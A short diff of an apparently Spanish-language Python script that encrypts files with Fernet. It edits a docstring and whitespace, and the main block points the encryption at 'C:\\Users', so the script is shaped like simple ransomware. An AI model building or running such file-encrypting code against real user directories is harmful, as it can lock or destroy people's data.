@@ -20,7 +20,8 @@ def retornarkey():
 def encryp(items, key):
      """
           Funcion encrypt 
-          Nos ayuda a generar lo necesario para generar nuestra clave
+          Nos ayuda a generar lo necesario para generar la encriptacion de los
+          archivos
      """
      i = Fernet(key)
      for x in items:
@@ -34,4 +35,4 @@ if __name__ = "__main__":
 
      #En la siguiente linea se debe de escribir la ruta de los archivos a encryptar
      archivos = 'C:\\Users'
-     
+
